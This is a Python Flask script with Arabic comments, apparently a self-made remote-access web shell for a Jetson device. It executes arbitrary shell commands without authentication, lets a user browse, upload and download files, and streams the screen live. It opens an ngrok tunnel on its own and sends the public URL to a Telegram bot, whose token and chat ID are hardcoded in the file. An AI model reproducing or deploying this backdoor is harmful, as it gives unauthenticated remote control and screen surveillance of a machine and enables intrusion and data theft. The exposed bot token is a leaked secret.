# -*- coding: utf-8 -*-
from flask import Flask, render_template_string, request, send_file, Response
import os
import subprocess
import threading
import time
import urllib.request
import json
import mss
import cv2
import numpy as np

app = Flask(__name__)

# ضع بياناتك هنا بدقة (نسخ ولصق)
TELEGRAM_BOT_TOKEN = "8508402230:AAGK5iP1fxc7Dscu5pDmqWkAGLCCYLtKrB0"
TELEGRAM_CHAT_ID = "8897834377"

def send_telegram_message(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = json.dumps({"chat_id": TELEGRAM_CHAT_ID, "text": message}).encode('utf-8')
        req = urllib.request.Request(url, data=data, headers={'Content-Type': 'application/json'})
        urllib.request.urlopen(req)
    except Exception as e:
        print(f"[-] Telegram Error: {e}")

# دالة تشغيل Ngrok المحلي وجلب الرابط وإرساله للتيليجرام تلقائياً
def start_ngrok_and_notify():
    time.sleep(3) # الانتظار حتى يعمل سيرفر الفلاسك
    try:
        # تشغيل ngrok المحلي في الخلفية على البورت 8080
        os.system("./ngrok http 8080 > /dev/null 2>&1 &")
        time.sleep(4)
        
        # جلب الرابط الخارجي من واجهة ngrok المحلية
        req = urllib.request.urlopen("http://127.0.0.1:4040/api/tunnels")
        data = json.loads(req.read().decode())
        public_url = data['tunnels'][0]['public_url']
        
        # إرسال الرابط مباشرة إلى بوت تيليجرام
        msg = f"🚀 تم تشغيل الـ Web Shell بنجاح على جهاز الـ Jetson!\n\n🔗 رابط الدخول الخارجي:\n{public_url}"
        send_telegram_message(msg)
        print(f"[+] تم إرسال الرابط إلى تيليجرام بنجاح: {public_url}")
    except Exception as e:
        print(f"[-] خطأ في تشغيل أو جلب رابط Ngrok: {e}")

# دالة التقاط الشاشة للبث الحي
def generate_frames():
    try:
        with mss.mss() as sct:
            monitor = sct.monitors[1]
            while True:
                img = np.array(sct.grab(monitor))
                img = cv2.resize(img, (640, 360))
                ret, buffer = cv2.imencode('.jpg', img, [cv2.IMWRITE_JPEG_QUALITY, 70])
                frame = buffer.tobytes()
                yield (b'--frame\r\n'
                       b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
    except Exception:
        while True:
            blank_img = np.zeros((360, 640, 3), dtype=np.uint8)
            cv2.putText(blank_img, "Live Stream: No GUI / Display", (50, 180), 
                        cv2.FONT_HERSHEY_SIMPLEX, 0.7, (0, 255, 0), 2)
            ret, buffer = cv2.imencode('.jpg', blank_img)
            frame = buffer.tobytes()
            yield (b'--frame\r\n'
                   b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>Advanced Web Shell with Live Stream</title>
    <style>
        body { background-color: #0d1117; color: #c9d1d9; font-family: 'Courier New', Courier, monospace; margin: 0; padding: 20px; }
        h2 { color: #58a6ff; text-align: center; border-bottom: 2px solid #30363d; padding-bottom: 10px; }
        .container { max-width: 1200px; margin: auto; background: #161b22; padding: 20px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); position: relative; }
        .live-stream-box { position: fixed; top: 20px; right: 20px; width: 320px; background: #21262d; border: 2px solid #238636; border-radius: 6px; box-shadow: 0 4px 12px rgba(0,0,0,0.8); z-index: 1000; padding: 5px; text-align: center; }
        .live-stream-box h4 { margin: 5px 0; color: #7ee787; font-size: 14px; }
        .live-stream-box img { width: 100%; border-radius: 4px; display: block; }
        .section { margin-bottom: 25px; padding: 15px; background: #21262d; border-radius: 6px; border: 1px solid #30363d; max-width: 800px; }
        pre { background-color: #010409; color: #7ee787; padding: 15px; border-radius: 5px; max-height: 300px; overflow-y: auto; white-space: pre-wrap; word-wrap: break-word; }
        input[type="text"], input[type="file"] { width: 70%; padding: 8px; background: #0d1117; color: #fff; border: 1px solid #30363d; font-family: monospace; border-radius: 4px; }
        input[type="submit"], button { padding: 8px 15px; background: #238636; color: #fff; border: none; font-weight: bold; cursor: pointer; border-radius: 4px; }
        input[type="submit"]:hover, button:hover { background: #2ea043; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        th, td { padding: 10px; text-align: left; border-bottom: 1px solid #30363d; }
        th { background: #1f6feb; color: white; }
        a { color: #58a6ff; text-decoration: none; }
        .path-bar { font-size: 16px; color: #f0883e; margin-bottom: 10px; }
    </style>
</head>
<body>
    <div class="live-stream-box">
        <h4>🔴 بث مباشر للشاشة</h4>
        <img src="{{ url_for('video_feed') }}" alt="Live Stream">
    </div>
    <div class="container">
        <h2>⚡ لوحة التحكم الذكية مع البث المباشر ⚡</h2>
        <div class="section">
            <div class="path-bar">📁 المسار الحالي: <code>{{ current_path }}</code></div>
            <a href="/?path={{ parent_path }}"><button>⬆ العودة للمجلد الأعلى</button></a>
        </div>
        <div class="section">
            <h3>💻 تنفيذ الأوامر (Terminal & Disk Check)</h3>
            <pre>{{ output }}</pre>
            <form method="POST">
                <input type="hidden" name="action" value="cmd">
                <input type="text" name="command" placeholder="اكتب الأمر (مثل: df -h, ls, free)..." autofocus autocomplete="off">
                <input type="submit" value="تنفيذ">
            </form>
        </div>
        <div class="section">
            <h3>📂 استعراض الأقراص والملفات</h3>
            <table>
                <tr><th>الاسم</th><th>النوع</th><th>إجراءات</th></tr>
                {% for item in items %}
                <tr>
                    <td>
                        {% if item.is_dir %}
                            📁 <a href="/?path={{ item.path }}">{{ item.name }}</a>
                        {% else %}
                            📄 {{ item.name }}
                        {% endif %}
                    </td>
                    <td>{{ 'مجلد' if item.is_dir else 'ملف' }}</td>
                    <td>
                        {% if not item.is_dir %}
                            <a href="/download?file={{ item.path }}" target="_blank"><button style="background: #1f6feb;">تحميل</button></a>
                        {% endif %}
                    </td>
                </tr>
                {% endfor %}
            </table>
        </div>
        <div class="section">
            <h3>📤 رفع ملف للجهاز</h3>
            <form method="POST" enctype="multipart/form-data">
                <input type="hidden" name="action" value="upload">
                <input type="file" name="file">
                <input type="submit" value="رفع">
            </form>
        </div>
    </div>
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def index():
    current_path = request.args.get('path', os.getcwd())
    current_path = os.path.abspath(current_path)
    parent_path = os.path.dirname(current_path)
    output = "أهلاً بك يا محمد! نظام التحكم والبث الحي جاهز:\n"
    
    if request.method == "POST":
        action = request.form.get("action")
        if action == "cmd":
            command = request.form.get("command")
            if command:
                output += f"root@system:{current_path}$ {command}\n"
                try:
                    res = subprocess.run(command, shell=True, cwd=current_path, capture_output=True, text=True, timeout=15)
                    output += res.stdout + res.stderr
                except Exception as e:
                    output += f"Error: {str(e)}\n"
        elif action == "upload":
            uploaded_file = request.files.get('file')
            if uploaded_file:
                file_path = os.path.join(current_path, uploaded_file.filename)
                uploaded_file.save(file_path)
                output += f"[+] تم رفع الملف بنجاح إلى: {file_path}\n"

    items = []
    try:
        for entry in os.scandir(current_path):
            items.append({
                'name': entry.name,
                'is_dir': entry.is_dir(),
                'path': entry.path
            })
    except Exception as e:
        output += f"خطأ: {str(e)}\n"

    return render_template_string(HTML_TEMPLATE, current_path=current_path, parent_path=parent_path, output=output, items=items)

@app.route('/video_feed')
def video_feed():
    return Response(generate_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route("/download")
def download():
    file_path = request.args.get('file')
    if file_path and os.path.exists(file_path):
        return send_file(file_path, as_attachment=True)
    return "الملف غير موجود!", 404

if __name__ == "__main__":
    # تشغيل خيط خلفي لتفعيل نجروك وإرسال الرابط للبوت تلقائياً
    t = threading.Thread(target=start_ngrok_and_notify)
    t.daemon = True
    t.start()
    
    app.run(host="0.0.0.0", port=8080, debug=False)
